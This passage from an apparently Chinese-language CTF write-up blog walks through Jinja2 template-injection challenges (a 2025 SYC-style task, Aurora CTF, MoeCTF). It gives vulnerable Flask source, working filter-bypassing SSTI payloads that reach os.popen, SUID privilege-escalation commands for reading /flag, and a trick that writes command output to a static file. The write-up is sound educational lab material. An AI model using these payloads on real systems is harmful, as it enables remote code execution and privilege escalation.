class="string">&quot;tojson&quot;</span>,<span class="string">&quot;datetime&quot;</span>,<span class="string">&quot;cycler&quot;</span>,<span class="string">&quot;joiner&quot;</span>,<span class="string">&quot;namespace&quot;</span>,<span class="string">&quot;lipsum&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> w <span class="keyword">in</span> waf:</span><br><span class="line">            <span class="keyword">if</span> w <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;waf&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = (request.form.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>, error=<span class="string">&quot;用户名和密码不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> USERS:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>, error=<span class="string">&quot;用户名已存在&quot;</span>)</span><br><span class="line">        USERS[username] = &#123;<span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">        session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = (request.form.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        user = USERS.get(username)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user.get(<span class="string">&quot;password&quot;</span>) != password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>, error=<span class="string">&quot;用户名或密码错误&quot;</span>)</span><br><span class="line">        session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/profile&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    name_raw = request.args.get(<span class="string">&quot;name&quot;</span>, user)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filtered = waf(name_raw)</span><br><span class="line">        tmpl = <span class="string">f&quot;欢迎，<span class="subst">&#123;filtered&#125;</span>&quot;</span></span><br><span class="line">        rendered_snippet = render_template_string(tmpl)</span><br><span class="line">        error_msg = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        rendered_snippet = <span class="string">&quot;&quot;</span></span><br><span class="line">        error_msg = <span class="string">f&quot;渲染错误: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;profile.html&quot;</span>,</span><br><span class="line">        content=rendered_snippet,</span><br><span class="line">        name_input=name_raw,</span><br><span class="line">        user=user,</span><br><span class="line">        error_msg=error_msg,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    base_dir = os.path.join(os.path.dirname(__file__), <span class="string">&quot;story&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        entries = <span class="built_in">sorted</span>([f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(base_dir) <span class="keyword">if</span> os.path.isfile(os.path.join(base_dir, f))])</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        entries = []</span><br><span class="line"></span><br><span class="line">    filename = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        filename = request.form.get(<span class="string">&quot;filename&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filename = request.args.get(<span class="string">&quot;filename&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    content = <span class="literal">None</span></span><br><span class="line">    error = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        sanitized = filename.replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>)//可以看到这里只进行了一次匹配替换</span><br><span class="line">        target_path = os.path.join(base_dir, sanitized)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(target_path):</span><br><span class="line">            error = <span class="string">f&quot;文件不存在: <span class="subst">&#123;sanitized&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(target_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;read.html&quot;</span>, files=entries, content=content, filename=filename, error=error, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>看出来是SSTI注入，源码的重点在</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(payload) <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">114</span>, <span class="number">514</span>):</span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    waf = [<span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__base__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>, <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;import&quot;</span>,<span class="string">&quot;self&quot;</span>,<span class="string">&quot;session&quot;</span>,<span class="string">&quot;blueprints&quot;</span>,<span class="string">&quot;get_debug_flag&quot;</span>,<span class="string">&quot;json&quot;</span>,<span class="string">&quot;get_template_attribute&quot;</span>,<span class="string">&quot;render_template&quot;</span>,<span class="string">&quot;render_template_string&quot;</span>,<span class="string">&quot;abort&quot;</span>,<span class="string">&quot;redirect&quot;</span>,<span class="string">&quot;make_response&quot;</span>,<span class="string">&quot;Response&quot;</span>,<span class="string">&quot;stream_with_context&quot;</span>,<span class="string">&quot;flash&quot;</span>,<span class="string">&quot;escape&quot;</span>,<span class="string">&quot;Markup&quot;</span>,<span class="string">&quot;MarkupSafe&quot;</span>,<span class="string">&quot;tojson&quot;</span>,<span class="string">&quot;datetime&quot;</span>,<span class="string">&quot;cycler&quot;</span>,<span class="string">&quot;joiner&quot;</span>,<span class="string">&quot;namespace&quot;</span>,<span class="string">&quot;lipsum&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> waf:</span><br><span class="line">        <span class="keyword">if</span> w <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;waf&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>当<code>name</code>传参的字符串长度不为114或514时，它会删除内容中所有的左括号，当长度等于114或514时，则会进行waf黑名单过滤，尝试绕过左括号是不可能的，这里只能进行黑名单绕过</p>
<p>接下来研读<a target="_blank" rel="noopener" href="https://wwwmarin.xyz/">@marin</a>师傅搓的payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(a,a,<span class="built_in">dict</span>(get=a,item=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> o=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(request.values.a) %&#125;</span><br><span class="line">&#123;&#123; (url_for|attr(glo))|attr(getitem)(o)|attr(popen)(cmd)|attr(read)() &#125;&#125;<span class="number">11111111111111111111111111111111111111111111111111111111111111111111111</span>  //字符长度为<span class="number">514</span></span><br></pre></td></tr></table></figure>

<br/>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join %&#125;</span><br></pre></td></tr></table></figure>

<p>这里创建了一个变量<code>p</code>，<code>dict(po=a,p=a)</code>创建了一个字典，然后利用<code>|join</code>过滤器将键名拼接返回字符串，最后<code>p=pop</code></p>
<br/>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>) %&#125;</span><br></pre></td></tr></table></figure>

<p>在 Jinja2 中使用 <code>select</code> 过滤器获得生成器对象，输出类似于<code>&lt;generator object select_or_reject at 0x7f8334407e20&gt;</code>，可以利用这个构建<code>&quot;_&quot;</code></p>
<p>当有效输入为<code>&#123;% set a=(''|select|string|list) %&#125;&#123;% print a %&#125;</code>时，页面的有效回显是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>利用前面构建的<code>pop</code>函数提取序号为24的字符就完成了下划线的构建</p>
<br/>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(a,a,<span class="built_in">dict</span>(get=a,item=a)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> o=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br></pre></td></tr></table></figure>

<p>此处构建了<code>__init__</code>、<code>__globals__</code>、<code>__getitem__</code>、<code>popen</code>、<code>read</code>和<code>os</code>，原理同第一条</p>
<br/>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> cmd=(request.values.a) %&#125;</span><br></pre></td></tr></table></figure>

<p>创建变量<code>cmd</code>，它的值等于GET传入的参数<code>a</code>的值</p>
<br/>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; (url_for|attr(glo))|attr(getitem)(o)|attr(popen)(cmd)|attr(read)() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>此处已等价于<code>&#123;&#123; (url_for|attr('__globals__'))|attr('__getitem__')(os)|attr('popen')(cmd)|attr('read')() &#125;&#125;</code></p>
<p>也相当于<code>&#123;&#123; url_for['__globals__']['__getitem__']('os')['popen'](cmd)['read']() &#125;&#125;</code></p>
<br/>

<p>此时就可以进行命令执行了，传入payload和<code>a=ls /</code>，可以看到<code>flag</code>文件，尝试提取发现无回显，可能是需要<strong>提权</strong>，做题时可以用<code>&#123;&#123; cycler.__init__.__globals__['os'].environ &#125;&#125;</code>查看全局变量，这里有一个提示<code>&#39;HINT&#39;: &#39;用我提个权吧&#39;</code>，接下来查找提权的文件，传入<code>a=find / -user root -perm -4000 -print 2&gt;/dev/null</code>，回显</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/usr/bin/su </span><br><span class="line">/usr/bin/gpasswd </span><br><span class="line">/usr/bin/chfn </span><br><span class="line">/usr/bin/chsh </span><br><span class="line">/usr/bin/umount </span><br><span class="line">/usr/bin/newgrp </span><br><span class="line">/usr/bin/passwd </span><br><span class="line">/usr/bin/mount </span><br><span class="line">/usr/local/bin/env</span><br></pre></td></tr></table></figure>

<p>结合在环境变量读到的hint，利用<code>/usr/local/bin/env</code>进行提权，传入<code>a=/usr/local/bin/env cat /flag</code>即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;D0nt_m@ke_w1sdom_awar3_of_Rules_019aa4645e167e239a74402217bba8d1&#125;</span><br></pre></td></tr></table></figure>

<br/>

<h3 id="Aurora-CTF-2025-戈达尔的剧本工厂"><a href="#Aurora-CTF-2025-戈达尔的剧本工厂" class="headerlink" title="[Aurora CTF 2025]戈达尔的剧本工厂"></a>[Aurora CTF 2025]戈达尔的剧本工厂</h3><blockquote>
<p>hint:本题只考察一个漏洞。能回显输入的内容，可能考察什么漏洞？根据测试结果和被waf的内容确定考察的漏洞吧</p>
<p>hint:这题中的Aurora{test_flag}是假的flag，真的flag在环境变量里</p>
</blockquote>
<p>这是内部新生赛的题目，本题的Base64编码要求应该是防焚靖设计，但新生赛的时候还是焚靖一把梭了（乐，现决定正常复现一次</p>
<p>已经知道方向是Jinja2模板注入，<code>&#123;&#123;7*7&#125;&#125;</code>编码后传入回显49，测试几次后发现过滤了<code>&#39;&#39;</code>、<code>&quot;&quot;</code>、<code>[]</code>、<code>&#123;&#123;&#125;&#125;</code>、<code>.</code>和一些关键字（发现<code>class</code>被waf了，后面关键字索性都绕过了）</p>
<p>完整的payload是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> cla=<span class="built_in">dict</span>(c=a,l=a,a=a,ss=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> down=(lipsum|string|<span class="built_in">list</span>)|attr(po)(<span class="number">18</span>) %&#125; //下划线</span><br><span class="line">&#123;% <span class="built_in">set</span> clas=(down,down,cla,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bas=(down,down,<span class="built_in">dict</span>(b=<span class="number">0</span>,<span class="keyword">as</span>=<span class="number">0</span>,e=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> sub=(down,down,<span class="built_in">dict</span>(sub=<span class="number">0</span>,cla=<span class="number">0</span>,sse=<span class="number">0</span>,s=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> get=(down,down,<span class="built_in">dict</span>(get=<span class="number">0</span>,ite=<span class="number">0</span>,m=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(down,down,<span class="built_in">dict</span>(ini=<span class="number">0</span>,t=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(down,down,<span class="built_in">dict</span>(glo=<span class="number">0</span>,bal=<span class="number">0</span>,s=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=<span class="number">0</span>,en=<span class="number">0</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> re=<span class="built_in">dict</span>(re=<span class="number">0</span>,ad=<span class="number">0</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(lipsum|string|<span class="built_in">list</span>)|attr(po)(<span class="number">9</span>) %&#125; //空格</span><br><span class="line">&#123;% <span class="built_in">set</span> king=()|attr(clas)|attr(bas)|attr(sub)()|attr(get)(<span class="number">134</span>)|attr(ini)|attr(glo)|string|<span class="built_in">list</span>|attr(po)(<span class="number">463</span>) %&#125; //斜杠</span><br><span class="line">&#123;% <span class="built_in">set</span> ls=(<span class="built_in">dict</span>(l=<span class="number">0</span>,s=<span class="number">0</span>)|join,a,king)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> env=<span class="built_in">dict</span>(en=<span class="number">0</span>,v=<span class="number">0</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> d=()|attr(clas)|attr(bas)|attr(sub)()|attr(get)(<span class="number">134</span>)|attr(ini)|attr(glo)|attr(get)(pop)(env)|attr(re)() %&#125;</span><br><span class="line">&#123;% <span class="built_in">print</span> d %&#125;</span><br></pre></td></tr></table></figure>

<p>看着虽然比较复杂，但都是机械性的操作，而且此题不一定要到命令执行那一步，只要做到<code>__globals__</code>就可以看环境变量拿flag了</p>
<blockquote>
<p>如果要到命令执行，调用<code>popen</code>时不能直接attr，因为我们访问的<code>__globals__</code>是一个字典，要用<code>__getitem__</code>读取，前面marin师傅是<code>globals</code>-&gt;<code>os</code>-&gt;<code>popen</code>，是从<code>os</code>模块里调用</p>
</blockquote>
<br/>

<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>有时题目会不展示代码执行结果或直接不回显，这时的处理方法包括但不限于外带、反弹shell、转移执行结果、打内存马,这里来看看操作成本较低的转移执行结果，参考自<a target="_blank" rel="noopener" href="https://saintcen.github.io/2025/10/13/MoeCTF2025_Web_wp/#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E7%AB%A0-%E8%A1%80%E6%B5%B7%E6%A0%B8%E5%BF%83%E5%8D%83%E5%B9%B4%E6%89%8B%E6%AE%B5">MoeCTF2025_Web_wp | Sa1ntCHENの小窝</a></p>
<h3 id="MoeCTF-2025-第二十二章-血海核心·千年手段"><a href="#MoeCTF-2025-第二十二章-血海核心·千年手段" class="headerlink" title="[MoeCTF 2025]第二十二章 血海核心·千年手段"></a>[MoeCTF 2025]第二十二章 血海核心·千年手段</h3><p>题目给了源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = request.args.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            login_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;用户名或密码不能为空&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            login_msg = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;Welcome: <span class="subst">&#123;username&#125;</span>&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">            render_template_string(login_msg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        login_msg = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, login_msg=login_msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>我们无论输入什么，页面都会直接返回payload本身，要获取命令执行结果，这里可以新开一个我们能访问的页面，把执行结果写入一个文本中，payload是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).makedirs(<span class="string">&#x27;static&#x27;</span>, exist_ok=<span class="literal">True</span>) <span class="keyword">or</span> url_for.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;builtins&#x27;</span>).<span class="built_in">open</span>(<span class="string">&#x27;static/read.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(url_for.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls /&#x27;</span>).read()) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑是在当前目录新建一个子目录<code>static</code>，再新建一个文件<code>read.txt</code>，把<code>ls /</code>执行的结果写入其中，执行后访问<code>http://127.0.0.1:51581/static/read.txt</code>可以看到根目录下有<code>flag</code>文件，尝试cat失败，推测需要提权，利用<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>查找具有管理员权限的文件</p>
<blockquote>
<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>执行逻辑</p>
<p><code>-user root</code>：文件的所有者必须是root用户</p>
<p><code>-perm -4000</code>：查找设置了SUID位的文件，<code>4000</code> 是SUID（Set User ID）的八进制表示</p>
<p><code>-print</code>：输出匹配文件的完整路径名</p>
<p><code>2&gt;/dev/null</code>：将标准错误输出重定向到 <code>/dev/null</code>，目的是隐藏权限拒绝等错误信息</p>
</blockquote>
<p>后面确定<code>/usr/bin/rev</code>是提权的目标文件，但是不能直接用，<a target="_blank" rel="noopener" href="https://p111223.github.io/">@mervin</a>让我尝试<code>ls /usr/bin/rev</code>可以看到<code>rev.c</code>，查看原码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i + <span class="number">1</span> &lt; argc; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;--HDdss&quot;</span>, argv[i]) == <span class="number">0</span>) &#123;</span><br><span class="line">            execvp(argv[i + <span class="number">1</span>], &amp;argv[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要一个<code>--HDdss</code>才能正常提权，后续<code>/usr/bin/rev --HDdss cat /flag</code>就能成功提权拿flag了</p>
